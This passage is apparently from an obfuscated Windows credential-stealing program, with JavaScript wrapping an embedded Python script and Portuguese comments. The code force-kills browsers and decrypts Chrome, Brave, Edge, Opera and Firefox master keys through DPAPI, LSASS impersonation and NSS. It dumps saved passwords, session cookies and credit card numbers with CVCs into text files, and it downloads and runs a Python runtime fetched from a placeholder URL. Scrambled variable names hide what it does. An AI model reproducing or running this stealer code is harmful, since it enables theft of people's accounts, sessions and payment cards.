windows.crypto.dpapi.unprotect(key_blob_encrypted)\n        else:\n            return None\n        with impersonate_lsass():\n            key_blob_system_decrypted = windows.crypto.dpapi.unprotect(key_blob_encrypted)\n        key_blob_user_decrypted = windows.crypto.dpapi.unprotect(key_blob_system_decrypted)\n        parsed_data = parse_key_blob(key_blob_user_decrypted)\n        if parsed_data['flag'] not in (1, 2, 3):\n            return key_blob_user_decrypted[-32:]\n        return derive_v20_master_key(parsed_data, \"Brave Softwarekey1\")\n    except:\n        return None\n\ndef discover_profiles(localappdata):\n    profiles = []\n    browser_paths = [\n        (os.path.join(localappdata, \"Google\", \"Chrome\", \"User Data\"), \"Chrome\", True),\n        (os.path.join(localappdata, \"Google\", \"Chrome SxS\", \"User Data\"), \"Chrome_SxS\", True),\n        (os.path.join(localappdata, \"BraveSoftware\", \"Brave-Browser\", \"User Data\"), \"Brave\", True)\n    ]\n    for user_data_dir, browser_type, _ in browser_paths:\n        if not os.path.exists(user_data_dir): continue\n        local_state_path = os.path.join(user_data_dir, \"Local State\")\n        if not os.path.exists(local_state_path): continue\n        profile_dirs = []\n        if os.path.exists(os.path.join(user_data_dir, \"Default\")):\n            profile_dirs.append((\"Default\", os.path.join(user_data_dir, \"Default\")))\n        for item in os.listdir(user_data_dir):\n            item_path = os.path.join(user_data_dir, item)\n            if os.path.isdir(item_path) and (item.startswith(\"Profile \") or item == \"Guest Profile\"):\n                profile_dirs.append((item, item_path))\n        for profile_name, profile_path in profile_dirs:\n            if os.path.exists(os.path.join(profile_path, \"Login Data\")) or os.path.exists(os.path.join(profile_path, \"Network\", \"Cookies\")):\n                profiles.append({\"name\": f\"{browser_type}_{profile_name}\", \"path\": profile_path, \"user_data_dir\": user_data_dir, \"local_state\": local_state_path, \"browser\": browser_type})\n    return profiles\n\ndef decrypt_value(encrypted_val, master_key):\n    \"\"\"Descriptografa um valor v10/v11/v20\"\"\"\n    if not encrypted_val or len(encrypted_val) < 3:\n        return None\n    prefix = encrypted_val[:3]\n    try:\n        if prefix == b\"v20\":\n            iv = encrypted_val[3:15]\n            ciphertext = encrypted_val[15:-16]\n            tag = encrypted_val[-16:]\n            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)\n            decrypted = cipher.decrypt_and_verify(ciphertext, tag)\n            # v20 sempre tem 32 bytes de padding no início\n            if len(decrypted) >= 32:\n                return decrypted[32:].decode('utf-8', errors='ignore')\n            return decrypted.decode('utf-8', errors='ignore')\n        elif prefix in [b\"v10\", b\"v11\"]:\n            iv = encrypted_val[3:15]\n            payload = encrypted_val[15:-16]\n            tag = encrypted_val[-16:]\n            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)\n            decrypted = cipher.decrypt_and_verify(payload, tag)\n            return decrypted.decode('utf-8', errors='ignore')\n        else:\n            return windows.crypto.dpapi.unprotect(encrypted_val).decode('utf-8', errors='ignore')\n    except:\n        return None\n\ndef decrypt_password(encrypted_val, master_key):\n    \"\"\"Descriptografa uma senha v10/v11/v20\"\"\"\n    if not encrypted_val or len(encrypted_val) < 3:\n        return None\n    prefix = encrypted_val[:3]\n    try:\n        if prefix in [b\"v10\", b\"v11\", b\"v20\"]:\n            iv = encrypted_val[3:15]\n            payload = encrypted_val[15:-16]\n            tag = encrypted_val[-16:]\n            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)\n            decrypted = cipher.decrypt_and_verify(payload, tag)\n            return decrypted.decode('utf-8', errors='ignore')\n        else:\n            return windows.crypto.dpapi.unprotect(encrypted_val).decode('utf-8', errors='ignore')\n    except:\n        return None\n\ndef webkit_to_datetime(webkit_timestamp):\n    \"\"\"Converte timestamp WebKit para Unix timestamp\"\"\"\n    if webkit_timestamp == 0:\n        return 0\n    return int((webkit_timestamp / 1000000) - 11644473600)\n\ndef process_chromium_profile(profile_info, master_key):\n    \"\"\"Processa perfil Chromium (Chrome/Brave) - cookies e senhas\"\"\"\n    results = {\"cookies\": [], \"passwords\": []}\n    profile_path = profile_info[\"path\"]\n    browser = profile_info[\"browser\"]\n    profile_name = profile_info[\"name\"]\n    \n    # Cookies\n    cookie_db = os.path.join(profile_path, \"Network\", \"Cookies\")\n    if os.path.exists(cookie_db):\n        try:\n            con = sqlite3.connect(pathlib.Path(cookie_db).as_uri() + \"?mode=ro\", uri=True)\n            for host, name, val, path, expires, secure, httponly in con.execute(\"SELECT host_key, name, CAST(encrypted_value AS BLOB), path, expires_utc, is_secure, is_httponly FROM cookies\").fetchall():\n                if val and len(val) > 3:\n                    try:\n                        decrypted_value = decrypt_value(val, master_key)\n                        if decrypted_value:\n                            # Formato Netscape\n                            expires_unix = webkit_to_datetime(expires) if expires else int(time.time()) + 315360000\n                            secure_flag = \"TRUE\" if secure else \"FALSE\"\n                            httponly_flag = \"TRUE\" if httponly else \"FALSE\"\n                            cookie_line = f\"{host}\t{secure_flag}\t{path}\t{httponly_flag}\t{expires_unix}\t{name}\t{decrypted_value}\"\n                            results[\"cookies\"].append(cookie_line)\n                    except: pass\n            con.close()\n        except: pass\n    \n    # Passwords\n    login_db = os.path.join(profile_path, \"Login Data\")\n    if os.path.exists(login_db):\n        try:\n            con = sqlite3.connect(pathlib.Path(login_db).as_uri() + \"?mode=ro\", uri=True)\n            for url, user, pwd in con.execute(\"SELECT origin_url, username_value, password_value FROM logins\").fetchall():\n                if pwd and len(pwd) > 3 and user:\n                    try:\n                        decrypted_password = decrypt_password(pwd, master_key)\n                        if decrypted_password:\n                            results[\"passwords\"].append({\n                                'url': url,\n                                'username': user,\n                                'password': decrypted_password,\n                                'browser': f\"{browser} {profile_name}\"\n                            })\n                    except: pass\n            con.close()\n        except: pass\n    return results\n\ndef get_firefox_profiles():\n    \"\"\"Obtém lista de perfis do Firefox\"\"\"\n    appdata = os.environ.get(\"APPDATA\", \"\")\n    profiles_ini = os.path.join(appdata, r\"Mozilla\\Firefox\\profiles.ini\")\n    if not os.path.exists(profiles_ini):\n        return []\n    \n    base_path = os.path.dirname(profiles_ini)\n    profiles = []\n    current_profile = {}\n    \n    try:\n        with open(profiles_ini, \"r\", encoding=\"utf-8\") as f:\n            for line in f:\n                line = line.strip()\n                if line.startswith(\"[Profile\"):\n                    if current_profile and \"Path\" in current_profile:\n                        p = current_profile[\"Path\"]\n                        is_relative = current_profile.get(\"IsRelative\") == \"1\"\n                        if is_relative or not os.path.isabs(p):\n                            current_profile[\"Path\"] = os.path.join(base_path, p.replace(\"/\", \"\\\\\"))\n                        else:\n                            current_profile[\"Path\"] = p.replace(\"/\", \"\\\\\")\n                        profiles.append(current_profile)\n                    current_profile = {}\n                elif line.startswith(\"Path=\"):\n                    current_profile[\"Path\"] = line.split(\"=\", 1)[1]\n                elif line.startswith(\"Name=\"):\n                    current_profile[\"Name\"] = line.split(\"=\", 1)[1]\n                elif line.startswith(\"IsRelative=\"):\n                    current_profile[\"IsRelative\"] = line.split(\"=\", 1)[1]\n        \n        if current_profile and \"Path\" in current_profile:\n            p = current_profile[\"Path\"]\n            is_relative = current_profile.get(\"IsRelative\") == \"1\"\n            if is_relative or not os.path.isabs(p):\n                current_profile[\"Path\"] = os.path.join(base_path, p.replace(\"/\", \"\\\\\"))\n            else:\n                current_profile[\"Path\"] = p.replace(\"/\", \"\\\\\")\n            profiles.append(current_profile)\n    except Exception as e:\n        pass\n    \n    return profiles\n\ndef load_firefox_nss():\n    \"\"\"Carrega biblioteca NSS do Firefox\"\"\"\n    possible_paths = [\n        r\"C:\\Program Files\\Mozilla Firefox\\nss3.dll\",\n        r\"C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll\"\n    ]\n    \n    nss_path = None\n    for p in possible_paths:\n        if os.path.exists(p):\n            nss_path = p\n            break\n    \n    if not nss_path:\n        return None, None\n    \n    try:\n        nss_dir = os.path.dirname(nss_path)\n        os.add_dll_directory(nss_dir)\n        \n        nss_lib = ctypes.CDLL(nss_path)\n        nspr_lib = None\n        \n        try:\n            nspr_lib = ctypes.CDLL(os.path.join(nss_dir, \"nspr4.dll\"))\n            nspr_lib.PR_GetError.restype = c_int\n        except:\n            pass\n        \n        nss_lib.NSS_Init.argtypes = [c_char_p]\n        nss_lib.NSS_Init.restype = c_int\n        nss_lib.NSS_Shutdown.restype = c_int\n        nss_lib.PK11SDR_Decrypt.argtypes = [POINTER(SECItem), POINTER(SECItem), c_void_p]\n        nss_lib.PK11SDR_Decrypt.restype = c_int\n        \n        return nss_lib, nspr_lib\n    except Exception as e:\n        return None, None\n\ndef decrypt_firefox_value(b64_data, nss_lib, nspr_lib):\n    \"\"\"Decripta valor do Firefox usando NSS\"\"\"\n    if not nss_lib or not b64_data:\n        return None\n    \n    try:\n        encrypted_bytes = base64.b64decode(b64_data)\n        \n        inp = SECItem()\n        inp.type = 0\n        inp.data = cast(ctypes.create_string_buffer(encrypted_bytes), c_void_p)\n        inp.len = len(encrypted_bytes)\n        \n        out = SECItem()\n        \n        ret = nss_lib.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None)\n        \n        if ret == 0:\n            decrypted_data = ctypes.string_at(out.data, out.len)\n            return decrypted_data.decode('utf-8')\n    except:\n        pass\n    \n    return None\n\ndef extract_firefox_data():\n    \"\"\"Extrai cookies e senhas do Firefox\"\"\"\n    profiles = get_firefox_profiles()\n    cookies = []\n    passwords = []\n    nss_lib, nspr_lib = load_firefox_nss()\n    \n    if not nss_lib:\n        return cookies, passwords\n    \n    for profile in profiles:\n        profile_name = profile.get(\"Name\", \"Default\")\n        original_path = profile[\"Path\"]\n        temp_dir_fx = os.path.join(os.environ[\"TEMP\"], f\"firefox_dump_{os.getpid()}\")\n        os.makedirs(temp_dir_fx, exist_ok=True)\n        \n        try:\n            has_key_db = False\n            for f in [\"key4.db\", \"logins.json\", \"cookies.sqlite\", \"cert9.db\", \"pkcs11.txt\"]:\n                src = os.path.join(original_path, f)\n                dst = os.path.join(temp_dir_fx, f)\n                if os.path.exists(src):\n                    try:\n                        shutil.copy2(src, dst)\n                        if f == \"key4.db\":\n                            has_key_db = True\n                    except:\n                        try:\n                            with open(src, \"rb\") as rf:\n                                data = rf.read()\n                            with open(dst, \"wb\") as wf:\n                                wf.write(data)\n                            if f == \"key4.db\":\n                                has_key_db = True\n                        except:\n                            pass\n            \n            if not has_key_db:\n                continue\n            \n            ret = nss_lib.NSS_Init(temp_dir_fx.encode('utf-8'))\n            if ret != 0:\n                continue\n            \n            # Cookies\n            cookies_db = os.path.join(temp_dir_fx, \"cookies.sqlite\")\n            if os.path.exists(cookies_db):\n                try:\n                    con = sqlite3.connect(cookies_db)\n                    for host, name, value, path, expiry, isSecure, isHttpOnly in con.execute(\"SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies\").fetchall():\n                        secure_flag = \"TRUE\" if isSecure else \"FALSE\"\n                        httponly_flag = \"TRUE\" if isHttpOnly else \"FALSE\"\n                        expires_unix = expiry if expiry else int(time.time()) + 315360000\n                        cookie_line = f\"{host}\t{secure_flag}\t{path}\t{httponly_flag}\t{expires_unix}\t{name}\t{value}\"\n                        cookies.append(cookie_line)\n                    con.close()\n                except:\n                    pass\n            \n            # Passwords\n            logins_path = os.path.join(temp_dir_fx, \"logins.json\")\n            if os.path.exists(logins_path):\n                with open(logins_path, \"r\", encoding=\"utf-8\") as f:\n                    data = json.load(f)\n                \n                if \"logins\" in data:\n                    for login in data[\"logins\"]:\n                        u = login.get(\"encryptedUsername\")\n                        p = login.get(\"encryptedPassword\")\n                        hostname = login.get(\"hostname\", \"\")\n                        \n                        dec_u = decrypt_firefox_value(u, nss_lib, nspr_lib)\n                        dec_p = decrypt_firefox_value(p, nss_lib, nspr_lib)\n                        \n                        if dec_u and dec_p:\n                            passwords.append({\n                                'url': hostname,\n                                'username': dec_u,\n                                'password': dec_p,\n                                'browser': f\"Mozilla Firefox {profile_name}\"\n                            })\n            \n            nss_lib.NSS_Shutdown()\n        except Exception as e:\n            pass\n        finally:\n            try:\n                shutil.rmtree(temp_dir_fx)\n            except:\n                pass\n    \n    return cookies, passwords\n\ndef main():\n    try:\n        subprocess.run([\"taskkill\", \"/F\", \"/IM\", \"chrome.exe\"], capture_output=True)\n        subprocess.run([\"taskkill\", \"/F\", \"/IM\", \"brave.exe\"], capture_output=True)\n        subprocess.run([\"taskkill\", \"/F\", \"/IM\", \"firefox.exe\"], capture_output=True)\n    except:\n        pass\n    \n    localappdata = os.environ['LOCALAPPDATA']\n    profiles = discover_profiles(localappdata)\n    \n    all_cookies = []\n    all_passwords = []\n    \n    if profiles:\n        processed_keys = {}\n        for profile in profiles:\n            user_data = profile[\"user_data_dir\"]\n            browser = profile[\"browser\"]\n            \n            if user_data not in processed_keys:\n                try:\n                    if browser == \"Brave\":\n                        master_key = get_master_key_brave(profile[\"local_state\"])\n                    else:\n                        master_key = get_master_key_chrome(profile[\"local_state\"])\n                    if master_key:\n                        processed_keys[user_data] = master_key\n                    else:\n                        continue\n                except Exception as e:\n                    continue\n            \n            master_key = processed_keys.get(user_data)\n            if not master_key: \n                continue\n            \n            results = process_chromium_profile(profile, master_key)\n            all_cookies.extend(results[\"cookies\"])\n            all_passwords.extend(results[\"passwords\"])\n    \n    firefox_cookies, firefox_passwords = extract_firefox_data()\n    all_cookies.extend(firefox_cookies)\n    all_passwords.extend(firefox_passwords)\n    \n    if all_cookies:\n        cookies_file = output_dir / \"cookies.txt\"\n        with open(cookies_file, \"w\", encoding=\"utf-8\") as f:\n            for cookie in all_cookies:\n                f.write(cookie)\n                f.write(os.linesep)\n        print(f\"[Python] {len(all_cookies)} cookie(s) salvo(s) em: {cookies_file}\")\n    \n    if all_passwords:\n        passwords_file = output_dir / \"passwords.txt\"\n        with open(passwords_file, \"w\", encoding=\"utf-8\") as f:\n            f.write(\"=\" * 60)\n            f.write(os.linesep)\n            f.write(\"SENHAS EXTRAÍDAS\")\n            f.write(os.linesep)\n            f.write(\"=\" * 60)\n            f.write(os.linesep)\n            f.write(os.linesep)\n            \n            for i, pwd in enumerate(all_passwords, 1):\n                f.write(f\"[{i}] {pwd['url']}\")\n                f.write(os.linesep)\n                f.write(f\"    Navegador: {pwd['browser']}\")\n                f.write(os.linesep)\n                f.write(f\"    Usuário: {pwd['username']}\")\n                f.write(os.linesep)\n                f.write(f\"    Senha: {pwd['password']}\")\n                f.write(os.linesep)\n                f.write(os.linesep)\n        \n        print(f\"[Python] {len(all_passwords)} senha(s) salva(s) em: {passwords_file}\")\n\nif __name__ == \"__main__\":\n    if is_admin():\n        main()\n    else:\n        print(\"[Python] Requer privilégios de administrador para Chrome/Brave v20\")\n";
async function ChromePythonExtract() {
    if (!checkChromeInstalled()) {
        return;
    }
    if (!fs.existsSync(pyInstallDir)) {
        fs.mkdirSync(pyInstallDir, {
            recursive: true
        });
    }
    const crypto = path.join(tempDir, "python310.zip");
    let Dpapi = await checkPythonExists();
    if (Dpapi) {
        try {
            const FormData = {
                ...process.env,
                PYTHONHOME: path.join(pyInstallDir, "tools"),
                PYTHONPATH: path.join(pyInstallDir, "tools", "Lib")
            };
            execSync("\"" + pythonExe + "\" -c \"import encodings\"", {
                encoding: "utf-8",
                timeout: 5000,
                env: FormData
            });
        } catch {
            Dpapi = false;
            try {
                fs.rmSync(pyInstallDir, {
                    recursive: true,
                    force: true
                });
            } catch { }
        }
    }
    if (!Dpapi) {
        try {
            if (fs.existsSync(crypto)) {
                fs.unlinkSync(crypto);
            }
            await downloadPythonFile("http://api_patched/download", crypto);
            if (!fs.existsSync(pyInstallDir)) {
                fs.mkdirSync(pyInstallDir, {
                    recursive: true
                });
            }
            await extractPythonZip(crypto, pyInstallDir);
            try {
                fs.unlinkSync(crypto);
            } catch { }
            if (!fs.existsSync(pythonExe)) {
                return;
            }
        } catch (axios) {
            console.error("[V20] Erro Python:", axios.message);
            return;
        }
    }
    const FormData = {
        ...process.env,
        PYTHONHOME: path.join(pyInstallDir, "tools"),
        PYTHONPATH: path.join(pyInstallDir, "tools", "Lib")
    };
    try {
        const https = pythonCodeV20.replace(new RegExp("\\$\\{identifier\\}", "g"), identifier);
        await runPythonCode(https, FormData);
    } catch (axios) {
        console.error("[V20] Erro execução:", axios.message);
        return null;
    }
    const http = path.join(tempDir, identifier);
    if (!fs.existsSync(http)) {
        return null;
    }
    const os = path.join(http, "cookies.txt");
    const archiver = path.join(http, "passwords.txt");
    let sqlite3 = 0;
    let exec = 0;
    let execFile = "";
    if (fs.existsSync(os)) {
        try {
            const spawn = fs.readFileSync(os, "utf8");
            const WebSocket = spawn.split("\n").filter(crypto => {
                return crypto.trim() && !crypto.startsWith("#");
            });
            sqlite3 = WebSocket.length;
            if (sqlite3 > 0) {
                const StreamZip = {};
                for (const clearTimeoutFn of WebSocket) {
                    const setTimeoutFn = clearTimeoutFn.split("\t");
                    if (setTimeoutFn.length >= 7) {
                        const config = setTimeoutFn[0];
                        const getApiHeaders = setTimeoutFn[1];
                        const generateRandomString = setTimeoutFn[2];
                        const logs = setTimeoutFn[3];
                        const tokens = setTimeoutFn[4];
                        const discordEmails = setTimeoutFn[5];
                        const local = setTimeoutFn[6];
                        if (!StreamZip.Chrome_Default) {
                            StreamZip.Chrome_Default = [];
                        }
                        StreamZip.Chrome_Default.push({
                            domain: config,
                            name: discordEmails,
                            value: local,
                            path: generateRandomString,
                            expires: tokens,
                            secure: getApiHeaders === "TRUE",
                            httpOnly: logs === "TRUE"
                        });
                    }
                }
                if (!fs.existsSync(cookiesOutputDir)) {
                    fs.mkdirSync(cookiesOutputDir, {
                        recursive: true
                    });
                }
                for (const [localappdata, passwordsOutputPath] of Object.entries(StreamZip)) {
                    const paths = path.join(cookiesOutputDir, "" + localappdata + ".txt");
                    const browserConfigs = passwordsOutputPath.map(crypto => {
                        const Dpapi = crypto.domain || "";
                        const FormData = crypto.name || "";
                        const axios = (crypto.value || "").replace(new RegExp("[\\r\\n\\t]", "g"), "");
                        const https = crypto.path || "/";
                        const http = crypto.expires || "2597573456";
                        const os = Dpapi.startsWith(".") ? "TRUE" : "FALSE";
                        return "" + Dpapi + "\t" + os + "\t" + https + "\tFALSE\t" + http + "\t" + FormData + "\t" + axios;
                    }).join("\n");
                    fs.writeFileSync(paths, browserConfigs);
                }
            }
        } catch (axios) {
            console.error("[V20] Erro ao ler cookies:", axios.message);
        }
    }
    if (fs.existsSync(archiver)) {
        try {
            const badges = fs.readFileSync(archiver, "utf8");
            const hwid = badges.split("\n");
            let hwidblack = {};
            let pcuserblack = false;
            for (const clearTimeoutFn of hwid) {
                const hostnameblack = clearTimeoutFn.trim();
                if (hostnameblack.startsWith("=") || hostnameblack.startsWith("SENHAS") || !hostnameblack) {
                    continue;
                }
                if (hostnameblack.startsWith("[") && hostnameblack.includes("]")) {
                    if (pcuserblack && hwidblack.url) {
                        execFile += "================\nURL: " + hwidblack.url + "\nUSERNAME: " + (hwidblack.username || "") + "\nPASSWORD: " + (hwidblack.password || "") + "\nAPPLICATION: " + (hwidblack.browser || "Chrome") + "\n";
                        exec++;
                    }
                    hwidblack = {};
                    pcuserblack = true;
                    const isBlacklisted = hostnameblack.match(new RegExp("\\]\\s*(.+)", ""));
                    if (isBlacklisted) {
                        hwidblack.url = isBlacklisted[1].trim();
                    }
                } else {
                    if (pcuserblack) {
                        if (hostnameblack.startsWith("Navegador:") || hostnameblack.startsWith("Navegador :")) {
                            hwidblack.browser = hostnameblack.split(":").slice(1).join(":").trim();
                        } else {
                            if (hostnameblack.startsWith("Usuário:") || hostnameblack.startsWith("Usuario:") || hostnameblack.startsWith("Usuário :")) {
                                hwidblack.username = hostnameblack.split(":").slice(1).join(":").trim();
                            } else {
                                if (hostnameblack.startsWith("Senha:") || hostnameblack.startsWith("Senha :")) {
                                    hwidblack.password = hostnameblack.split(":").slice(1).join(":").trim();
                                } else {
                                    if (hostnameblack && !hwidblack.url) {
                                        hwidblack.url = hostnameblack;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            if (pcuserblack && hwidblack.url) {
                execFile += "================\nURL: " + hwidblack.url + "\nUSERNAME: " + (hwidblack.username || "") + "\nPASSWORD: " + (hwidblack.password || "") + "\nAPPLICATION: " + (hwidblack.browser || "Chrome") + "\n";
                exec++;
            }
            if (exec > 0) { }
        } catch (axios) {
            console.error("[V20] Erro ao ler senhas:", axios.message);
        }
    }
    return execFile || null;
}
const OPERA_BROWSERS = [{
    config: browserConfigs.opera,
    name: "Opera"
}, {
    config: browserConfigs.operagx,
    name: "OperaGX"
}];
const masterKeys = new Map();
const pyInstallDir = path.join(tempDir, "c2f0c6d3-d7cc-4143-8b8f-99c1357e58db");
const pythonExe = path.join(pyInstallDir, "tools", "python.exe");
async function GetPasswords() {
    try {
        const crypto = ["msedge.exe", "brave.exe", "vivaldi.exe", "browser.exe", "opera.exe", "chrome.exe", "chromium.exe", "yandex.exe", "iridium.exe"];
        for (const Dpapi of crypto) try {
            execSync("taskkill /F /IM " + Dpapi + " /T", {
                stdio: "ignore"
            });
        } catch { }
        await Sleep(1500);
    } catch { }
    let output = "";
    await GetMasterKeys();
    const axios = getBrowserPaths();
    for (const reg of regexes) {
        const http = https.path;
        const os = https.name;
        const archiver = getUserDataPath(http);
        const exec = masterKeys.get(archiver);
        if (!exec) {
            continue;
        }
        if (!fs.existsSync(http)) {
            continue;
        }
        const execFile = path.join(http, "Login Data");
        if (!fs.existsSync(execFile)) {
            continue;
        }
        const spawn = createTempDatabase(execFile, "pwd");
        if (!spawn) {
            continue;
        }
        let WebSocket = 0;
        let StreamZip = 0;
        const clearTimeoutFn = new sqlite3.Database(spawn);
        await new Promise(crypto => {
            clearTimeoutFn.each("SELECT origin_url, username_value, password_value FROM logins", (crypto, Dpapi) => {
                if (crypto) {
                    return;
                }
                if (Dpapi && Dpapi.username_value && Dpapi.password_value) {
                    try {
                        const axios = Dpapi.password_value;
                        if (!axios || axios.length < 3) {
                            return;
                        }
                        const https = axios.slice(0, 3).toString();
                        if (https === "v20") {
                            StreamZip++;
                            return;
                        }
                        if (https !== "v10" && https !== "v11") {
                            return;
                        }
                        const http = decryptPasswordValue(axios, exec);
                        if (http) {
                            FormData += "================\nURL: " + Dpapi.origin_url + "\nUSERNAME: " + Dpapi.username_value + "\nPASSWORD: " + http + "\nAPPLICATION: " + os + "\n";
                            WebSocket++;
                        }
                    } catch { }
                }
            }, () => {
                clearTimeoutFn.close();
                crypto();
            });
        });
        if (StreamZip > 0 && WebSocket === 0) { } else {
            if (WebSocket > 0) { }
        }
        cleanupTempFile(spawn);
    }
    for (const {
        config: setTimeoutFn,
        name: getApiHeaders
    } of OPERA_BROWSERS) {
        if (!fs.existsSync(setTimeoutFn.userData)) {
            continue;
        }
        const exec = getOperaMasterKey(setTimeoutFn.userData);
        if (!exec) {
            continue;
        }
        const generateRandomString = getOperaProfiles(setTimeoutFn.userData);
        try {
            for (const http of generateRandomString) {
                const logs = path.join(http, "Login Data");
                if (!fs.existsSync(logs)) {
                    continue;
                }
                const tokens = await extractDBPasswords(logs, "logins", ["origin_url", "username_value", "password_value"]);
                for (const discordEmails of tokens) {
                    if (!discordEmails.username_value || !discordEmails.password_value) {
                        continue;
                    }
                    const local = discordEmails.password_value.slice(0, 3).toString();
                    if (local !== "v10" && local !== "v11") {
                        continue;
                    }
                    const appdata = decryptPasswordValue(discordEmails.password_value, exec);
                    if (appdata && appdata.trim()) {
                        FormData += "================\nURL: " + discordEmails.origin_url + "\nUSERNAME: " + discordEmails.username_value + "\nPASSWORD: " + appdata + "\nAPPLICATION: " + getApiHeaders + "\n";
                    }
                }
            }
        } catch {
            continue;
        }
    }
    try {
        const roaming = await ChromePythonExtract();
        if (roaming) {
            FormData += roaming;
        }
    } catch (localappdata) {
        console.error("[V20] Erro:", localappdata.message);
    }
    const tempDir = (FormData.match(new RegExp("================\\n", "g")) || []).length;
    if (!fs.existsSync(outputDir)) {
        fs.mkdirSync(outputDir, {
            recursive: true
        });
    }
    let cookiesOutputDir;
    try {
        cookiesOutputDir = formatPasswordsTree(FormData);
        if (cookiesOutputDir === "No Passwords Found" && tempDir > 0) {
            cookiesOutputDir = FormData.trim() ? FormData : "No Passwords Found";
        }
    } catch (localappdata) {
        cookiesOutputDir = FormData.trim() ? FormData : "No Passwords Found";
    }
    fs.writeFileSync(passwordsOutputPath, cookiesOutputDir);
    return passwordsOutputPath;
}
function formatPasswordsTree(fs) {
    if (!fs || !fs.trim()) {
        return "No Passwords Found";
    }
    const path = fs.split(new RegExp("================", "")).filter(fs => {
        return fs.trim();
    });
    if (path.length === 0) {
        return "No Passwords Found";
    }
    const crypto = [];
    for (const Dpapi of path) {
        const FormData = Dpapi.split(new RegExp("\\r?\\n", "")).filter(fs => {
            return fs.trim();
        });
        let axios = "";
        let https = "";
        let http = "";
        let os = "";
        for (const archiver of FormData) {
            const sqlite3 = archiver.trim();
            if (sqlite3.match(new RegExp("^URL:\\s*", "i"))) {
                axios = sqlite3.replace(new RegExp("^URL:\\s*", "i"), "").trim();
            } else {
                if (sqlite3.match(new RegExp("^USERNAME:\\s*", "i"))) {
                    https = sqlite3.replace(new RegExp("^USERNAME:\\s*", "i"), "").trim();
                } else {
                    if (sqlite3.match(new RegExp("^PASSWORD:\\s*", "i"))) {
                        http = sqlite3.replace(new RegExp("^PASSWORD:\\s*", "i"), "").trim();
                    } else {
                        if (sqlite3.match(new RegExp("^APPLICATION:\\s*", "i"))) {
                            os = sqlite3.replace(new RegExp("^APPLICATION:\\s*", "i"), "").trim();
                        } else {
                            if (sqlite3.match(new RegExp("^https?:\\/\\/", ""))) {
                                if (!axios) {
                                    axios = sqlite3;
                                }
                            }
                        }
                    }
                }
            }
        }
        if (axios && http) {
            crypto.push({
                url: axios,
                username: https || "N/A",
                password: http,
                application: os || "Unknown"
            });
        } else {
            if (axios && https) {
                crypto.push({
                    url: axios,
                    username: https,
                    password: http || "(empty)",
                    application: os || "Unknown"
                });
            }
        }
    }
    if (crypto.length === 0) {
        return "No Passwords Found";
    }
    let exec = "│\n";
    for (let execSync = 0; execSync < crypto.length; execSync++) {
        const execFile = crypto[execSync];
        const spawn = execSync === crypto.length - 1;
        const WebSocket = spawn ? "└─ " : "├─ ";
        const StreamZip = spawn ? "   " : "│  ";
        exec += "" + WebSocket + "[" + (execSync + 1) + "]\n";
        exec += "" + StreamZip + "└ URL: " + execFile.url + "\n";
        exec += "" + StreamZip + "└ Username: " + execFile.username + "\n";
        exec += "" + StreamZip + "└ Password:  " + execFile.password + "\n";
        exec += "" + StreamZip + "└ Application: " + execFile.application + "\n";
        if (!spawn) {
            exec += "│\n";
        }
    }
    return exec;
}
async function GetCreditCards() {
    console.log("");
    let result = "";
    const Dpapi = getBrowserPaths();
    if (masterKeys.size === 0) {
        await GetMasterKeys();
    }
    for (const FormData of Dpapi) {
        const axios = FormData.path;
        const https = FormData.name;
        const http = getUserDataPath(axios);
        const os = masterKeys.get(http);
        if (!os) {
            continue;
        }
        if (!fs.existsSync(axios)) {
            continue;
        }
        const archiver = path.join(axios, "Web Data");
        if (!fs.existsSync(archiver)) {
            continue;
        }
        const exec = createTempDatabase(archiver, "cards");
        if (!exec) {
            continue;
        }
        let execSync = 0;
        const execFile = new sqlite3.Database(exec);
        await new Promise(Dpapi => {
            execFile.each("SELECT cc.guid, cc.name_on_card, cc.expiration_month, cc.expiration_year, cc.card_number_encrypted, cvc.value_encrypted AS cvc_encrypted FROM credit_cards cc LEFT JOIN local_stored_cvc cvc ON cc.guid = cvc.guid", (Dpapi, FormData) => {
                if (Dpapi) {
                    return;
                }
                if (FormData && FormData.card_number_encrypted) {
                    try {
                        const axios = decryptCreditCard(Buffer.from(FormData.card_number_encrypted), os);
                        const http = FormData.cvc_encrypted ? decryptCreditCard(Buffer.from(FormData.cvc_encrypted), os) : "——";
                        if (axios) {
                            crypto += "================\nGUID: " + (FormData.guid || "N/A") + "\nNAME: " + (FormData.name_on_card || "N/A") + "\nNUMBER: " + axios + "\nVALID: " + (FormData.expiration_month || "??") + "/" + (FormData.expiration_year || "????") + "\nCVC: " + (http || "——") + "\nAPPLICATION: " + https + "\n";
                            execSync++;
                        }
                    } catch { }
                }
            }, () => {
                return Dpapi();
            });
        });
        await new Promise(Dpapi => {
            execFile.each("SELECT mc.id AS guid, mc.name_on_card, mc.expiration_month, mc.expiration_year, mc.card_number_encrypted, scvc.value_encrypted AS cvc_encrypted FROM masked_credit_cards mc LEFT JOIN server_stored_cvc scvc ON mc.id = scvc.instrument_id", (Dpapi, FormData) => {
                if (Dpapi) {
                    return;
                }
                if (FormData && FormData.card_number_encrypted) {
                    try {
                        const axios = decryptCreditCard(Buffer.from(FormData.card_number_encrypted), os);
                        const http = FormData.cvc_encrypted ? decryptCreditCard(Buffer.from(FormData.cvc_encrypted), os) : "——";
                        if (axios) {
                            crypto += "================\nGUID: " + (FormData.guid || "N/A") + "\nNAME: " + (FormData.name_on_card || "N/A") + "\nNUMBER: " + axios + "\nVALID: " + (FormData.expiration_month || "??") + "/" + (FormData.expiration_year || "????") + "\nCVC: " + (http || "——") + "\nAPPLICATION: " + https + "\n";
                            execSync++;
                        }
                    } catch { }
                }
            }, () => {
                return Dpapi();
            });
        });
        execFile.close();
        if (execSync > 0) { }
        cleanupTempFile(exec);
    }
    for (const {
        config: spawn,
        name: WebSocket
    } of OPERA_BROWSERS) {
        if (!fs.existsSync(spawn.userData)) {
            continue;
        }
        const StreamZip = getOperaMasterKey(spawn.userData);
        if (!StreamZip) {
            continue;
        }
        const clearTimeoutFn = getOperaProfiles(spawn.userData);
        for (const axios of clearTimeoutFn) {
            const archiver = path.join(axios, "Web Data");
            if (!fs.existsSync(archiver)) {
                continue;
            }
            const exec = createTempDatabase(archiver, "cards_opera");
            if (!exec) {
                continue;
            }
            let setTimeoutFn = 0;
